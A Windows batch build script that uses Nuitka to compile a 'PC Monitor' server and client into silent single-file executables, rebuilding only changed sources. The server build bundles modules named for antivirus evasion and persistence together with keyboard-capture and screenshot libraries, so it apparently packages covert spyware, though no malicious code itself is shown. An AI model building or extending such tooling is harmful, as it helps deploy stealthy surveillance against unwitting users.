@echo off
echo ========================================
echo PC Monitor Cached Build Script
echo ========================================
echo.

REM Create cache directory
if not exist ".build_cache" mkdir .build_cache

REM Check Python version
python --version
echo.

REM Check if Nuitka is installed
python -m nuitka --version >nul 2>&1
if errorlevel 1 (
    echo Nuitka not found. Installing...
    pip install nuitka
    echo.
)

REM ========================================
REM CACHE CHECKING FUNCTION
REM ========================================

echo Checking for file changes...
echo.

set REBUILD_SERVER=0
set REBUILD_CLIENT=0

REM Check server files
echo [Server Files]
for %%F in (server.py) do (
    if exist "%%F" (
        call :check_file "%%F" REBUILD_SERVER
    )
)

for %%F in (server_modules\*.py) do (
    if exist "%%F" (
        call :check_file "%%F" REBUILD_SERVER
    )
)

for %%F in (evasion_modules\*.py) do (
    if exist "%%F" (
        call :check_file "%%F" REBUILD_SERVER
    )
)

for %%F in (persistence_modules\*.py) do (
    if exist "%%F" (
        call :check_file "%%F" REBUILD_SERVER
    )
)

REM Check client files
echo.
echo [Client Files]
for %%F in (client.py) do (
    if exist "%%F" (
        call :check_file "%%F" REBUILD_CLIENT
    )
)

for %%F in (client_modules\*.py) do (
    if exist "%%F" (
        call :check_file "%%F" REBUILD_CLIENT
    )
)

echo.
echo Build Status:
if %REBUILD_SERVER%==0 (
    echo   Server: No changes detected
) else (
    echo   Server: Changes detected - REBUILD REQUIRED
)

if %REBUILD_CLIENT%==0 (
    echo   Client: No changes detected
) else (
    echo   Client: Changes detected - REBUILD REQUIRED
)
echo.

REM Check if builds exist
set SERVER_EXISTS=0
set CLIENT_EXISTS=0
if exist "dist\PCMonitor.exe" set SERVER_EXISTS=1
if exist "dist\PCMonitorClient.exe" set CLIENT_EXISTS=1

REM Determine what needs building
set SKIP_SERVER=0
set SKIP_CLIENT=0

if %REBUILD_SERVER%==0 if %SERVER_EXISTS%==1 (
    echo Server is up to date - skipping build
    set SKIP_SERVER=1
)

if %REBUILD_CLIENT%==0 if %CLIENT_EXISTS%==1 (
    echo Client is up to date - skipping build
    set SKIP_CLIENT=1
)

REM If nothing to build, exit
if %SKIP_SERVER%==1 if %SKIP_CLIENT%==1 (
    echo.
    echo ========================================
    echo All builds are up to date!
    echo ========================================
    echo.
    echo No rebuilding necessary.
    pause
    exit /b 0
)

REM ========================================
REM BUILD CONFIGURATION
REM ========================================
echo.
echo What needs to be built:
if %SKIP_SERVER%==0 (
    echo   - Server needs rebuilding
    set BUILD_SERVER=1
) else (
    set BUILD_SERVER=0
)

if %SKIP_CLIENT%==0 (
    echo   - Client needs rebuilding
    set BUILD_CLIENT=1
) else (
    set BUILD_CLIENT=0
)

echo.
echo Select console window mode:
echo 1. No console (silent background mode - recommended)
echo 2. With console (see output/debug info)
echo.
set /p CONSOLE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%CONSOLE_CHOICE%"=="" set CONSOLE_CHOICE=1

echo.
echo Select optimization level:
echo 1. Fast build (development)
echo 2. Optimized build (production - smaller, faster)
echo.
set /p OPTIMIZE_CHOICE="Enter choice (1-2) [default: 2]: "
if "%OPTIMIZE_CHOICE%"=="" set OPTIMIZE_CHOICE=2

REM Set console flag
if "%CONSOLE_CHOICE%"=="1" (
    set CONSOLE_FLAG=--windows-disable-console
) else (
    set CONSOLE_FLAG=
)

REM Set optimization flags
if "%OPTIMIZE_CHOICE%"=="2" (
    set OPTIMIZE_FLAGS=--lto=yes
) else (
    set OPTIMIZE_FLAGS=--lto=no
)

REM Detect compiler
set USE_MSVC_FLAG=
where cl.exe >nul 2>&1
if not errorlevel 1 (
    set USE_MSVC_FLAG=--msvc=latest
)

echo.
echo ========================================
echo Starting Build with Nuitka...
echo ========================================
echo.

REM ========================================
REM BUILD SERVER
REM ========================================
if %BUILD_SERVER%==1 (
    echo ========================================
    echo Building Server PCMonitor.exe^)...
    echo ========================================
    echo.

    python -m nuitka ^
        --standalone ^
        --onefile ^
        %CONSOLE_FLAG% ^
        %USE_MSVC_FLAG% ^
        --output-dir=dist ^
        --output-filename=PCMonitor.exe ^
        --enable-plugin=tk-inter ^
        --include-package=flask ^
        --include-package=flask_cors ^
        --include-package=pynput ^
        --include-package=PIL ^
        --include-package=requests ^
        --include-package=server_modules ^
        --include-package=evasion_modules ^
        --include-package=persistence_modules ^
        --follow-imports ^
        --assume-yes-for-downloads ^
        %OPTIMIZE_FLAGS% ^
        --show-progress ^
        --show-memory ^
        server.py

    if errorlevel 1 (
        echo [ERROR] Server build failed!
        pause
        exit /b 1
    )
    echo [SUCCESS] Server built successfully!
    echo.
) else (
    echo [SKIPPED] Server build - no changes detected
    echo.
)

REM ========================================
REM BUILD CLIENT
REM ========================================
if %BUILD_CLIENT%==1 (
    echo ========================================
    echo Building Client ^(PCMonitorClient.exe^)...
    echo ========================================
    echo.

    python -m nuitka ^
        --standalone ^
        --onefile ^
        %CONSOLE_FLAG% ^
        %USE_MSVC_FLAG% ^
        --output-dir=dist ^
        --output-filename=PCMonitorClient.exe ^
        --enable-plugin=tk-inter ^
        --include-package=PIL ^
        --include-package=requests ^
        --include-package=flask ^
        --include-package=flask_cors ^
        --include-package=client_modules ^
        --follow-imports ^
        --assume-yes-for-downloads ^
        %OPTIMIZE_FLAGS% ^
        --show-progress ^
        --show-memory ^
        client.py

    if errorlevel 1 (
        echo [ERROR] Client build failed!
        pause
        exit /b 1
    )
    echo [SUCCESS] Client built successfully!
    echo.
) else (
    echo [SKIPPED] Client build - no changes detected
    echo.
)

REM Clean up temporary Nuitka folders
if exist *.dist rmdir /s /q *.dist
if exist *.build rmdir /s /q *.build
if exist *.onefile-build rmdir /s /q *.onefile-build

REM ========================================
REM BUILD COMPLETE
REM ========================================
echo.
echo ========================================
echo Build Complete!
echo ========================================
echo.
dir dist\*.exe
echo.
echo Build cache saved to .build_cache\
echo Next build will be faster if files haven't changed!
echo.
echo Press any key to open dist folder...
pause >nul
explorer dist

exit /b 0

REM ========================================
REM HELPER FUNCTION - Check file hash
REM ========================================
:check_file
setlocal
set "file=%~1"
set "var_name=%~2"

REM Generate safe filename for hash storage
set "hash_file=%file:\=_%"
set "hash_file=%hash_file:/=_%"
set "hash_file=.build_cache\%hash_file%.hash"

REM Calculate current hash
for /f "skip=1 tokens=* delims=" %%H in ('certutil -hashfile "%file%" MD5 2^>nul') do (
    set "new_hash=%%H"
    goto :got_hash
)
:got_hash

REM Remove spaces from hash
set "new_hash=%new_hash: =%"

REM Check if hash file exists and compare
if exist "%hash_file%" (
    set /p old_hash=<"%hash_file%"
    if "%new_hash%"=="%old_hash%" (
        REM No change
        goto :end_check
    )
)

REM File changed or is new
echo   Changed: %file%
set "%var_name%=1"

REM Save new hash
echo %new_hash%>"%hash_file%"

:end_check
endlocal & if "%var_name%"=="REBUILD_SERVER" set "REBUILD_SERVER=%REBUILD_SERVER%" & if "%var_name%"=="REBUILD_CLIENT" set "REBUILD_CLIENT=%REBUILD_CLIENT%"
exit /b 0